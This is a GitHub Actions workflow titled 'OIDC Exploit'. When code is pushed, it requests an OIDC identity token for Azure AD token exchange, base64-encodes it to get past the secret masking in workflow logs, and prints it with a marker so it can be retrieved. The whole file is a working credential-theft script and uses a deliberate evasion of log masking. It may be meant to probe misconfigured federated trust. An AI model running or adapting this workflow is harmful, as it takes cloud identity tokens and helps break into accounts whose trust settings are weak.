name: OIDC Exploit
on: push
permissions:
  id-token: write
  contents: read
jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Exfiltrate Token
        run: |
          # Request OIDC Token for THIS random repo
          TOKEN=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
          
          # Base64 encode to bypass secret masking in logs
          ENC_TOKEN=$(echo -n "$TOKEN" | base64 -w 0)
          
          # Print with known marker
          echo "EXTRACTED_OIDC_TOKEN: $ENC_TOKEN"
